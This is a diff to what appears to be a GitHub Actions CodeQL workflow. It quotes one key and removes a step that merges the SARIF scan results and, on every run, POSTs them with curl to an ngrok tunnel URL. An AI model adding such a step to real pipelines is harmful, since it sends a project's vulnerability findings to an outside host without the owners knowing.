@@ -44,7 +44,7 @@ jobs:
         uses: github/codeql-action/init@v3
         with:
           languages: ${{ matrix.language }}
-          build-mode: ${{ matrix.build-mode }}
+          "build-mode": ${{ matrix.build-mode }}
 
       - if: ${{ matrix.build-mode == 'manual' }}
         name: Manual build required
@@ -56,14 +56,3 @@ jobs:
         uses: github/codeql-action/analyze@v3
         with:
           category: ${{ matrix.language }}
-          output: results.sarif
-      
-      - name: Merge SARIF files
-        run: |
-          cat results.sarif/*.sarif > merged.sarif
-
-      - name: Send results to webhook
-        if: always()
-        run: |
-          curl -s -X POST             -H "Content-Type: application/json"             -d @merged.sarif             "https://240540c4406b.ngrok-free.app/test"
-
